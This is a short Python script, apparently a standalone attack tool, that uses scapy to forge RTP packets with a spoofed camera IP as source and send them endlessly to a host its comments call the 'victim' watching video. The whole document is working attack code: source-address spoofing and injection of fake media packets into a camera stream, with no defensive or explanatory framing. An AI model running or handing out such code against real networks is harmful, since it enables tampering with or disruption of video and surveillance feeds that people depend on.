from scapy.all import *
import time
import random

victim_ip = "192.168.1.100"     # Victim watching video
camera_ip = "192.168.1.104"     # Spoofed source (camera)
camera_port = 553              # Common RTP port (or use victim's actual port)
iface = "wlan0"                 # Use your correct interface (e.g. eth0, wlan0)

def build_rtp_packet(seq, timestamp):
    # RTP header fields
    version = 2
    padding = 0
    extension = 0
    csrc_count = 0
    marker = 0
    payload_type = 96
    ssrc = 12345678  # Random stream ID

    byte1 = (version << 6) | (padding << 5) | (extension << 4) | csrc_count
    byte2 = (marker << 7) | payload_type

    # Minimal fake payload
    payload = b'\x00' * 160

    rtp_header = struct.pack("!BBHII", byte1, byte2, seq, timestamp, ssrc)
    return rtp_header + payload

print(f"[*] Sending fake RTP packets from {camera_ip} to {victim_ip}")

seq = 0
ts = random.randint(10000, 99999)

while True:
    rtp = build_rtp_packet(seq, ts)
    pkt = IP(src=camera_ip, dst=victim_ip) / UDP(sport=553, dport=553) / Raw(load=rtp)
    send(pkt, iface=iface, verbose=False)
    seq += 1
    ts += 160  # simulate 20ms audio/video frame step
    time.sleep(0.02)  # ~50 packets/sec
